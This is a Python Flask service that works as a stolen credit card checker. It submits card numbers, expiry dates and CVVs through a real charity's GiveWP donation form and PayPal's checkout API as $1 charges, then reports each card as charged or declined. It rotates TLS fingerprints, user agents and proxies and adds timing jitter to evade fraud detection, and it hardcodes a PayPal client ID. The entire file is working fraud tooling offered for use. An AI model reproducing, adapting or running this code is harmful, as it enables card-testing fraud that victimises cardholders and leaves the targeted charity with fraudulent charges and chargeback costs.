import re
import html
import json
import time
import random
from urllib.parse import urlparse, parse_qs
from flask import Flask, request, jsonify

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HTTP ENGINE — rotate TLS fingerprints + user agents
# Prefer curl_cffi (browser-grade TLS/HTTP2 impersonation),
# fall back to plain requests when unavailable.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try:
    from curl_cffi import requests as http
    from curl_cffi.requests.exceptions import RequestException as _HttpException
    _TLS_IMPERSONATE = True
    _TLS_PROFILES = [
        "chrome124", "chrome123", "chrome120", "chrome116",
        "chrome131", "chrome131_android", "edge101",
        "safari18_0", "safari17_0", "safari18_0_ios", "safari17_2_ios",
        "firefox135",
    ]
except ImportError:
    import requests as http
    from requests.exceptions import RequestException as _HttpException
    _TLS_IMPERSONATE = False
    _TLS_PROFILES = []

app = Flask(__name__)

CLIENT_ID = "Ad1_Y0sSN2RdF_Rz-_hy5UGfEPAxpvQxq1MTq7FeGfDcbOV-AkGpUFizSxfAM0RhDwgVYlJ5Hb3E_cDf"
BASE_URL  = "elisgardenofhealing.com"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USER AGENTS — aligned with impersonation profiles
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/101.0.1210.53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY FORMATTER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def format_proxy(proxy_str):
    """Convert proxy format: host:port:user:pass -> http://user:pass@host:port"""
    if not proxy_str or proxy_str.lower() == "live":
        return None
    try:
        parts = proxy_str.split(":")
        if len(parts) == 4:
            host, port, user, password = parts
            return f"http://{user}:{password}@{host}:{port}"
        elif len(parts) == 2:
            host, port = parts
            return f"http://{host}:{port}"
        elif len(parts) == 1 and proxy_str.startswith("http"):
            return proxy_str
        else:
            return f"http://{proxy_str}"
    except Exception:
        return proxy_str

def _random_ua():
    return random.choice(USER_AGENTS)

def _random_tls():
    return random.choice(_TLS_PROFILES)

def _new_session(proxy_str=None):
    """Fresh session with a random TLS profile + user agent."""
    kwargs = {}
    if _TLS_IMPERSONATE:
        kwargs["impersonate"] = _random_tls()
    s = http.Session(**kwargs)
    s.headers.update({"User-Agent": _random_ua()})
    if proxy_str:
        proxy = format_proxy(proxy_str)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
    s._proxy_str = proxy_str
    return s

def _send(session, method, url, *, retries=1, **kw):
    """
    Send a request through the current session. On network errors or
    429/5xx responses, rebuild the session (fresh TLS + UA, same proxy)
    and retry. Returns (session, response_or_None).
    """
    resp = None
    for attempt in range(retries + 1):
        try:
            resp = session.request(method, url, **kw)
        except _HttpException:
            resp = None

        if resp is not None and resp.status_code not in (429, 500, 502, 503):
            return session, resp

        if attempt < retries:
            time.sleep(random.uniform(2.0, 4.5))
            proxy_str = getattr(session, "_proxy_str", None)
            session = _new_session(proxy_str)

    return session, resp

def _jitter():
    time.sleep(random.uniform(0.2, 0.6))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DECLINE CODE EXTRACTION
# PayPal ships verbose prose back in `description`. We want
# ONLY the SCREAMING_SNAKE token: GENERIC_DECLINE, LOST_OR_STOLEN,
# INSUFFICIENT_FUNDS, CVV2_FAILURE, SUSPECTED_FRAUD, etc.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_DECLINE_CODE_RE = re.compile(r'\b([A-Z][A-Z0-9_]{3,})\b')

# Prose words that LOOK like codes but aren't. Filtered out.
_DECLINE_STOPWORDS = {
    "PAYPAL", "ORDER", "HAS", "BEEN", "DECLINED", "TRANSACTION",
    "STATUS", "FOR", "VISA", "MASTERCARD", "DISCOVER", "AMERICAN",
    "EXPRESS", "CARD", "HOLDER", "THE", "ADDRESS", "AND", "POSTAL",
    "CODE", "ARE", "BOTH", "INCORRECT", "CVV2", "CSC", "MATCHES",
    "NOTHING", "SERVICE", "IS", "UNAVAILABLE", "INFORMATION",
    "AVAILABLE", "MAESTRO", "CHECKED", "OR", "ACQUIRER", "HAD",
    "NO", "RESPONSE", "WAS", "PROCESSED", "ANOTHER", "DO", "RETRY",
    "SAME", "TRY", "USING",
}

def _extract_decline_code(text):
    """
    Pull the SCREAMING_SNAKE decline code out of PayPal's verbose
    description. Returns e.g. 'GENERIC_DECLINE', 'LOST_OR_STOLEN',
    'INSUFFICIENT_FUNDS'. Falls back to None if nothing matches.
    """
    if not text:
        return None
    # First pass: prefer tokens containing underscores (real decline codes)
    for token in _DECLINE_CODE_RE.findall(text):
        if token not in _DECLINE_STOPWORDS and "_" in token:
            return token
    # Second pass: allow single-word codes that survive the stopword filter
    for token in _DECLINE_CODE_RE.findall(text):
        if token not in _DECLINE_STOPWORDS:
            return token
    return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SHORT HUMAN-READABLE RESPONSE MAP
# `response` gets one of these. `decline_description` gets the raw code.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_RESPONSE_MAP = {
    "INSUFFICIENT_FUNDS":           "Insufficient funds",
    "GENERIC_DECLINE":              "Card declined",
    "LOST_OR_STOLEN":               "Card reported lost or stolen",
    "SUSPECTED_FRAUD":              "Suspected fraud",
    "FRAUD_SUSPECTED":              "Suspected fraud",
    "CVV2_FAILURE":                 "CVV mismatch",
    "CVV_FAILURE":                  "CVV mismatch",
    "INVALID_ACCOUNT":              "Invalid account",
    "EXPIRED_CARD":                 "Expired card",
    "CARD_EXPIRED":                 "Expired card",
    "RESTRICTED_OR_INACTIVE_ACCOUNT": "Account restricted or inactive",
    "RESTRICTED_CARD":              "Card restricted",
    "INVALID_TRANSACTION":          "Invalid transaction",
    "PROCESSOR_DECLINED":           "Processor declined",
    "PAYER_ACCOUNT_RESTRICTED":     "Payer account restricted",
    "TRANSACTION_NOT_PERMITTED":    "Transaction not permitted",
    "DECLINED":                     "Card declined",
    "GATEWAY_ERROR":                "Gateway error",
}

def _short_response(code, fallback="Card declined"):
    """Map a decline code to a short human-readable line."""
    if not code:
        return fallback
    return _RESPONSE_MAP.get(code.upper(), fallback)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN CHECKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def run_paypal_check(cc, mm, yy, cvv, progress_callback=None, proxy_str=None, **kwargs):
    """
    Real-time PayPal charge checker.

    Args:
        cc, mm, yy, cvv : Card data
        proxy_str       : host:port:user:pass or host:port (optional)
        **kwargs        : Billing overrides (firstName, lastName, email, phone,
                          address1, address2, city, state, zip, country,
                          amount, currency)

    Returns dict with:
        status               : CHARGED | DECLINED | ERROR
        response             : short human line ("Card declined", "CVV mismatch", ...)
        decline_code         : raw PayPal issue code, e.g. "GENERIC_DECLINE"
        decline_description  : SCREAMING_SNAKE token pulled from PayPal prose
    """
    s = _new_session(proxy_str)

    t0 = time.time()

    # Optional billing params
    first_name = kwargs.get("firstName", "John")
    last_name  = kwargs.get("lastName",  "Doe")
    email      = kwargs.get("email",     "test@example.com")
    phone      = kwargs.get("phone",     "+14155552671")
    address1   = kwargs.get("address1",  "123 Main St")
    address2   = kwargs.get("address2",  "")
    city       = kwargs.get("city",      "San Francisco")
    state      = kwargs.get("state",     "CA")
    zip_code   = kwargs.get("zip",       "94102")
    country    = kwargs.get("country",   "US")
    currency   = kwargs.get("currency",  "USD")
    amount     = kwargs.get("amount",    "1")

    result = {
        "card":               f"{cc}|{mm}|{yy}|{cvv}",
        "gateway":            "PAYPAL 1$",
        "status":             "ERROR",
        "success":            False,
        "response":           "Initializing",
        "decline_code":       None,
        "decline_description": None,
        "paypal_order_id":    None,
        "facilitator_token":  False,
        "time_take":          0.0,
        "raw":                None,
    }

    def done():
        result["time_take"] = round(time.time() - t0, 2)
        return result

    try:
        if "20" in yy:
            yy = yy[2:]

        def progress(step, status, details=""):
            if progress_callback:
                progress_callback({
                    "step": step,
                    "status": status,
                    "details": details,
                    "timestamp": time.time(),
                    "elapsed": round(time.time() - t0, 2),
                })

        headers_base = {"User-Agent": s.headers.get("User-Agent")}

        # ── 1) Nonce fetch ─────────────────────────────────────
        progress("nonce_fetch", "in_progress", "Fetching donation form...")
        s, r = _send(s, "GET",
            f"https://{BASE_URL}/donate/",
            retries=2,
            params={
                "givewp-route": "donation-form-view",
                "form-id": "4649",
                "locale": "en_US",
            },
            headers=headers_base, timeout=25,
        )
        if r is None:
            result["response"] = "Failed to load donation page: connection error"
            return done()
        if r.status_code != 200:
            progress("nonce_fetch", "failed", f"Status: {r.status_code}")
            result["response"] = f"Failed to load donation page: {r.status_code}"
            return done()

        m_nonce = re.search(r'"donationFormNonce":"(.*?)"', r.text)
        if not m_nonce:
            progress("nonce_fetch", "failed", "Nonce not found in response")
            result["response"] = "Nonce not found"
            return done()
        don_id = m_nonce.group(1)
        progress("nonce_fetch", "completed", f"Nonce: {don_id[:20]}...")

        m_url = re.search(r'"donateUrl"\s*:\s*"(.*?)"', r.text)
        if not m_url:
            result["response"] = "Donate URL missing"
            return done()

        durl = html.unescape(m_url.group(1).replace("\\/", "/"))
        q    = parse_qs(urlparse(durl).query)
        sig  = q.get("givewp-route-signature", [""])[0]
        exp  = q.get("givewp-route-signature-expiration", [""])[0]
        result["route_signature"]  = sig
        result["route_expiration"] = exp

        # ── 2) Create PayPal order ─────────────────────────────
        progress("order_create", "in_progress", "Creating PayPal order...")
        b = "----geckoformboundary34a02a8a7b329f30b6a6b74440235503"

        data = (
            f"--{b}\nContent-Disposition: form-data; name=\"amount\"\n\n{amount}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"currency\"\n\n{currency}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"levelId\"\n\ncustom\n"
            f"--{b}\nContent-Disposition: form-data; name=\"donationType\"\n\nsingle\n"
            f"--{b}\nContent-Disposition: form-data; name=\"subscriptionPeriod\"\n\none-time\n"
            f"--{b}\nContent-Disposition: form-data; name=\"subscriptionFrequency\"\n\n1\n"
            f"--{b}\nContent-Disposition: form-data; name=\"subscriptionInstallments\"\n\n0\n"
            f"--{b}\nContent-Disposition: form-data; name=\"formId\"\n\n4649\n"
            f"--{b}\nContent-Disposition: form-data; name=\"gatewayId\"\n\npaypal-commerce\n"
            f"--{b}\nContent-Disposition: form-data; name=\"feeRecovery\"\n\n0\n"
            f"--{b}\nContent-Disposition: form-data; name=\"fundId\"\n\n1\n"
            f"--{b}\nContent-Disposition: form-data; name=\"firstName\"\n\n{first_name}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"lastName\"\n\n{last_name}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"email\"\n\n{email}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"phone\"\n\n{phone}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"country\"\n\n{country}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"address1\"\n\n{address1}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"address2\"\n\n{address2}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"city\"\n\n{city}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"state\"\n\n{state}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"zip\"\n\n{zip_code}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"comment\"\n\n\n"
            f"--{b}\nContent-Disposition: form-data; name=\"donationBirthday\"\n\n\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give-form-id\"\n\n4649\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give-form-hash\"\n\n{don_id}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give_payment_mode\"\n\npaypal-commerce\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give-amount\"\n\n{amount}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give-recurring-period\"\n\none-time\n"
            f"--{b}\nContent-Disposition: form-data; name=\"period\"\n\none-time\n"
            f"--{b}\nContent-Disposition: form-data; name=\"frequency\"\n\n1\n"
            f"--{b}\nContent-Disposition: form-data; name=\"times\"\n\n0\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give_first\"\n\n{first_name}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give_last\"\n\n{last_name}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give_email\"\n\n{email}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"card_address\"\n\n{address1}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"card_address_2\"\n\n{address2}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"card_city\"\n\n{city}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"card_state\"\n\n{state}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"card_zip\"\n\n{zip_code}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"billing_country\"\n\n{country}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"give-cs-form-currency\"\n\n{currency}\n"
            f"--{b}--\n"
        )

        _jitter()
        s, r2 = _send(s, "POST",
            f"https://{BASE_URL}/wp-admin/admin-ajax.php",
            retries=1,
            params={"action": "give_paypal_commerce_create_order"},
            headers={
                "User-Agent":   s.headers.get("User-Agent"),
                "Accept":       "*/*",
                "Content-Type": f"multipart/form-data; boundary={b}",
                "Origin":       f"https://{BASE_URL}",
                "Referer":      f"https://{BASE_URL}/?givewp-route=donation-form-view&form-id=4649&locale=en_US",
            },
            data=data.encode(), timeout=25,
        )

        order_id = None
        if r2 is not None:
            try:
                order_id = (r2.json().get("data") or {}).get("id")
            except ValueError:
                order_id = None

        if not order_id:
            progress("order_create", "failed",
                     f"Response: {getattr(r2, 'text', '')[:100] or 'no response'}")
            result["response"] = "PayPal order creation failed"
            result["raw"]      = getattr(r2, "text", "")[:500] or None
            return done()

        result["paypal_order_id"] = order_id
        progress("order_create", "completed", f"Order ID: {order_id}")

        # ── 3) Facilitator token ───────────────────────────────
        _jitter()
        progress("token_fetch", "in_progress", "Retrieving facilitator token...")
        s, rt_r = _send(s, "GET",
            f"https://www.paypal.com/smart/buttons?clientID={CLIENT_ID}&env=production",
            retries=2,
            headers={
                "User-Agent": s.headers.get("User-Agent"),
                "Referer":    f"https://{BASE_URL}/",
            },
            timeout=25,
        )
        rt = rt_r.text if rt_r is not None else ""

        fac = None
        m = re.search(r"spb\.setupButton\(({.*?})\);", rt, re.DOTALL)
        if m:
            try:
                fac = json.loads(m.group(1)).get("facilitatorAccessToken")
            except ValueError:
                pass
        if not fac:
            m = re.search(r'"facilitatorAccessToken":"([^"]+)"', rt)
            if m:
                fac = m.group(1)
        if not fac:
            progress("token_fetch", "failed", "Token not found in response")
            result["response"] = "Facilitator token not found"
            return done()

        result["facilitator_token"] = True
        progress("token_fetch", "completed", f"Token: {fac[:20]}...")

        # ── 4) Confirm payment source ──────────────────────────
        _jitter()
        progress("payment_confirm", "in_progress", "Confirming payment with PayPal...")
        payload = {
            "payment_source": {
                "card": {
                    "number":        cc,
                    "security_code": cvv,
                    "expiry":        f"20{yy}-{mm}",
                    "name":          first_name,
                }
            }
        }
        s, r4 = _send(s, "POST",
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            retries=0,
            headers={
                "User-Agent":    s.headers.get("User-Agent"),
                "Accept":        "application/json",
                "Authorization": f"Bearer {fac}",
                "Content-Type":  "application/json",
            },
            json=payload, timeout=30,
        )

        if r4 is not None:
            try:
                pj = r4.json()
            except ValueError:
                pj = {"http_status": r4.status_code, "body": r4.text[:500]}
        else:
            pj = {"http_status": 0, "body": "connection error"}

        # ── 4a) Not APPROVED → declined ────────────────────────
        if pj.get("status") != "APPROVED":
            details = pj.get("details")

            raw_issue = None
            raw_desc  = ""

            if isinstance(details, list) and details:
                d0 = details[0]
                raw_issue = d0.get("issue")
                raw_desc  = d0.get("description") or ""

            # decline_description = clean SCREAMING_SNAKE code only
            code = (
                _extract_decline_code(raw_desc)
                or _extract_decline_code(raw_issue or "")
                or (raw_issue.upper() if raw_issue else None)
                or "GENERIC_DECLINE"
            )

            # response = short human-readable line
            human = _short_response(code)

            result["decline_code"]        = raw_issue or code
            result["decline_description"] = code
            result["status"]              = "DECLINED"
            result["response"]            = human
            result["raw"]                 = pj

            progress("payment_confirm", "declined", f"{code} — {human}")
            return done()

        progress("payment_confirm", "approved", "Payment source approved by PayPal")

        # ── 5) Charge the order ────────────────────────────────
        _jitter()
        progress("charge_process", "in_progress", "Processing payment charge...")
        charge_data = (
            f"--{b}\nContent-Disposition: form-data; name=\"amount\"\n\n{amount}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"currency\"\n\n{currency}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"levelId\"\n\ncustom\n"
            f"--{b}\nContent-Disposition: form-data; name=\"donationType\"\n\nsingle\n"
            f"--{b}\nContent-Disposition: form-data; name=\"subscriptionPeriod\"\n\none-time\n"
            f"--{b}\nContent-Disposition: form-data; name=\"subscriptionFrequency\"\n\n1\n"
            f"--{b}\nContent-Disposition: form-data; name=\"subscriptionInstallments\"\n\n0\n"
            f"--{b}\nContent-Disposition: form-data; name=\"formId\"\n\n4649\n"
            f"--{b}\nContent-Disposition: form-data; name=\"gatewayId\"\n\npaypal-commerce\n"
            f"--{b}\nContent-Disposition: form-data; name=\"feeRecovery\"\n\n0\n"
            f"--{b}\nContent-Disposition: form-data; name=\"fundId\"\n\n1\n"
            f"--{b}\nContent-Disposition: form-data; name=\"firstName\"\n\n{first_name}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"lastName\"\n\n{last_name}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"email\"\n\n{email}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"phone\"\n\n{phone}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"country\"\n\n{country}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"address1\"\n\n{address1}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"address2\"\n\n{address2}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"city\"\n\n{city}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"state\"\n\n{state}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"zip\"\n\n{zip_code}\n"
            f"--{b}\nContent-Disposition: form-data; name=\"comment\"\n\n\n"
            f"--{b}\nContent-Disposition: form-data; name=\"donationBirthday\"\n\n\n"
            f"--{b}\nContent-Disposition: form-data; name=\"originUrl\"\n\nhttps://{BASE_URL}/donate/\n"
            f"--{b}\nContent-Disposition: form-data; name=\"isEmbed\"\n\ntrue\n"
            f"--{b}\nContent-Disposition: form-data; name=\"embedId\"\n\ngive-form-shortcode-1\n"
            f"--{b}\nContent-Disposition: form-data; name=\"locale\"\n\nen_US\n"
            f"--{b}\nContent-Disposition: form-data; name=\"gatewayData[payPalOrderId]\"\n\n{order_id}\n"
            f"--{b}--\n"
        )

        s, r5 = _send(s, "POST",
            f"https://{BASE_URL}/?givewp-route=donate"
            f"&givewp-route-signature={sig}"
            f"&givewp-route-signature-id=givewp-donate"
            f"&givewp-route-signature-expiration={exp}",
            retries=0,
            headers={
                "User-Agent":   s.headers.get("User-Agent"),
                "Accept":       "application/json",
                "Content-Type": f"multipart/form-data; boundary={b}",
                "Origin":       f"https://{BASE_URL}",
                "Referer":      f"https://{BASE_URL}/?givewp-route=donation-form-view&form-id=4649&locale=en_US",
            },
            data=charge_data.encode(), timeout=30,
        )

        if r5 is not None:
            try:
                charge_resp = r5.json()
            except ValueError:
                charge_resp = {"success": False, "error": r5.text[:500]}
        else:
            charge_resp = {"success": False, "error": "connection error during charge"}

        result["raw"] = charge_resp

        # ── 5a) Charged successfully ───────────────────────────
        if charge_resp.get("success") is True:
            progress("charge_process", "success", "Payment charged successfully")
            result["status"]  = "CHARGED"
            result["success"] = True
            result["response"] = "Payment successful"
            return done()

        # ── 5b) Charge failed ──────────────────────────────────
        errors         = charge_resp.get("data", {}).get("errors", {})
        gateway_errors = errors.get("errors", {}).get("gateway_error", [])

        raw_err = None
        if gateway_errors:
            raw_err = gateway_errors[0] if isinstance(gateway_errors, list) else str(gateway_errors)

        code = (
            _extract_decline_code(raw_err or "")
            or "GATEWAY_ERROR"
        )

        result["decline_code"]        = code
        result["decline_description"] = code
        result["status"]              = "DECLINED"
        result["response"]            = _short_response(code, fallback="Payment declined")
        progress("charge_process", "failed", f"{code} — {result['response']}")
        return done()

    except Exception as e:
        error_str = str(e).lower()
        result["status"] = "ERROR"

        if any(k in error_str for k in ("proxy", "connectionpool", "max retries", "global connection")):
            result["response"] = "Proxy not working - Dead proxy"
        else:
            result["response"] = "Transaction failed"

        return done()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FLASK ENDPOINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route("/stream", methods=["GET"])
def stream_chk():
    """
    Real-time payment checker.

    Parameters:
        card      : CC|MM|YY|CVV  (preferred)
        cc/mm/yy/cvv : individual params (fallback)
        price     : optional, cosmetic in response
        proxy     : host:port[:user:pass]  (optional, "Live" = none)
        + any billing fields (firstName, lastName, email, phone,
          address1, address2, city, state, zip, country, amount, currency)

    Response:
        {
          "cc"                 : "4111...|12|25|123",
          "Gateway"            : "PAYPAL 1$",
          "Response"           : "Card declined",            # short human line
          "Decline"            : "GENERIC_DECLINE",          # SCREAMING_SNAKE code
          "Price"              : 1.0,
          "Currency"           : "USD",
          "Status"             : false,
          "Proxy"              : "Live",
          "Time"               : "3.42s"
        }
    """
    card_param = request.args.get("card", "").strip()

    if card_param:
        parts = card_param.split("|")
        if len(parts) != 4:
            return jsonify({"error": "Invalid card format", "format": "CC|MM|YY|CVV"}), 400
        cc, mm, yy, cvv = [p.strip() for p in parts]
    else:
        cc  = request.args.get("cc",  "").strip()
        mm  = request.args.get("mm",  "").strip()
        yy  = request.args.get("yy",  "").strip()
        cvv = request.args.get("cvv", "").strip()
        if not all([cc, mm, yy, cvv]):
            return jsonify({"error": "Missing required parameters"}), 400

    kwargs = {}
    for param in ("firstName", "lastName", "email", "phone",
                  "address1", "address2", "city", "state",
                  "zip", "country", "amount", "currency"):
        value = request.args.get(param)
        if value:
            kwargs[param] = value

    price       = request.args.get("price", "1.00").strip()
    proxy_param = request.args.get("proxy", "").strip()
    proxy_status = proxy_param if proxy_param else "Live"

    result = run_paypal_check(cc, mm, yy, cvv, proxy_str=proxy_param, **kwargs)

    status_bool = result["status"] == "CHARGED"

    formatted_response = {
        "cc":        f"{cc}|{mm}|{yy}|{cvv}",
        "Gateway":   "PAYPAL 1$",
        "Response":  result["response"],                     # short human line
        "Decline":   result["decline_description"],          # clean code only
        "Price":     float(price),
        "Currency":  kwargs.get("currency", "USD"),
        "Status":    status_bool,
        "Proxy":     proxy_status,
        "Time":      f"{result['time_take']}s",
    }

    return jsonify(formatted_response)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5009, debug=False)